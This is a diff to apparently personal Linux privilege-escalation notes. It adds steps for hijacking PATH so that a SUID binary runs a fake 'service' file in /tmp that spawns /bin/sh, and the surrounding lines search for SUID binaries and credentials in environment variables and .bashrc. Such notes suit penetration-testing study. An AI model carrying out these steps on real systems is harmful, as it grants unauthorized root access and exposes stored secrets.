@@ -61,6 +61,15 @@ find / -perm -u=s -type f 2>/dev/null      #search for SUID-marked binaries
 find / -perm -1000 -type d 2>/dev/null    #??
 find / -perm -g=s -type f 2>/dev/null    #??
 
+#SUID File found but no path defined. In this example the "service" file had the suid bit set but no path defined
+####cd /tmp
+###touch service
+###chmod +x service
+###echo "/bin/sh" > service
+###export PATH=/tmp:$PATH        ###dd /tmp directory to start of path so it checks there first
+###Execute the SUID file from within the /tmp directory 
+
+
 #User Information
 env    #Sometimes administrators store credentials inside environment variables
 cat .bashrc    #Inspect .bashrc file for custom env variables
